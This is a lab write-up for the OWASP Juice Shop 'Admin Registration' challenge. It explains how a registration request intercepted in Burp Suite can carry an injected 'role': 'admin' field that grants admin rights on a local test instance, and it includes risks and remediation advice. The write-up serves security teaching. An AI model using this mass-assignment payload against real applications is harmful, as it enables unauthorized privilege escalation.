# Admin Registration
*Register as a user with administration priviliges.*
#### Category: Improper Input Validation
#### Difficulty: ★★★
#### Walktrough: [Video](https://go.screenpal.com/watch/cOh6jynt2Gz) - Duration 2:45 min

## Table of Contents:
- [Vulnerability Overview](#vulnerability-overview-improper-input-validation)
- [Risk and Impact](#risk-and-impact)
- [Reproduction Steps](#reproduction-steps)
- [Remediation](#remediation)

> [!WARNING]  
> The content provided in this repository is for educational and ethical security testing purposes only. All demonstrations were performed in a controlled, local environment using the OWASP Juice Shop, a deliberately insecure web application. Unauthorized access to computing systems is illegal. The author is not responsible for any misuse of this information. Always obtain explicit permission before testing any system that you do not own.

## Vulnerability Overview: Improper Input Validation
Improper Input Validation occurs when an application does not sufficiently filter or verify the data it receives from a user before processing it. In this challenge, the registration endpoint validates that the email and password strings are present, but it fails to validate the entire structure of the JSON object itself.

By adding an extra field `role`, the attacker exploits the application's lack of a strict input schema. The server-side logic assumes all provided keys are valid.

## Risk and Impact
- **Authorization Bypass**: Attackers can inject administrative or internal-only properties into their profile.

- **Data Integrity Issues**: If the server doesn't validate fields like `id`, `createdAt`, or `balance`, users could potentially overwrite their account history or financial status.

- **Privilege Escalation**: By setting an **admin** role, an attacker gains unauthorized access to restricted endpoints and sensitive administrative data.

## Reproduction Steps
### 1. Register a new user and analyze the Request/Response
Start by registering a standard user and observe its Request and Response in Burp Suite:

- Request:
```json
{
  "email":"test-customer@abc.com",
  "password":"aaaaa",
  "passwordRepeat":"aaaaa",
  "securityQuestion":{
    "id":1,
    "question":"Your eldest siblings middle name?",
    "createdAt":"2026-03-13T09:09:47.443Z",
    "updatedAt":"2026-03-13T09:09:47.443Z"
    },
    "securityAnswer":"a"
}
```

- Response:
```json
{
  "status":"success",
  "data":{
    "username":"",
    "role":"customer",
    "deluxeToken":"",
    "lastLoginIp":"0.0.0.0",
    "profileImage":"/assets/public/images/uploads/default.svg",
    "isActive":true,
    "id":23,
    "email":"test-customer@abc.com",
    "updatedAt":"2026-03-13T10:23:11.226Z",
    "createdAt":"2026-03-13T10:23:11.226Z",
    "deletedAt":null
  }
}
```
Note how the Response JSON contains far more internal properties like `id`, `isActive`, and `role`, that of course were never provided during the registration process.

### 2. Crafting the Malicious Input
Attempt a new registration, intercept the Request with the Burp Suite Interceptor and purposely include the `"role": "admin"` property:
```json
{
  "email": "special-customer@abc.com",
  "password": "aaaaa",
  "passwordRepeat": "aaaaa",
  "role": "admin",
  "securityQuestion": // and so on

```

### 3. Exploitation
Forward the request and inspect the `201 Created` response.  
Because the server does not perform strict input validation to reject unknown or restricted fields, it accepts the manipulated JSON and updates the the `role` key accordingly to `admin`.

### 4. Confirm the Admin Role
Log in and access the admin panel at `http://127.0.0.1:3000/#/administration`, confirming that the Exploitation worked successfully as intended.

## Remediation
- **Strict Schema Validation**: Enforce a strict schema validation using a validation library to define exactly what fields are allowed. If a field like role appears in the request, the application should either ignore it or return a 400 Bad Request error.

- **Data Transfer Objects (DTOs)**: Implement DTOs to map only the necessary properties from the request to the internal database model.

- **Least Privilege**: Attribute new accounts the lowest privilege level, regardless of what the user sends in the API request.


<--[Main Readme](/README.md)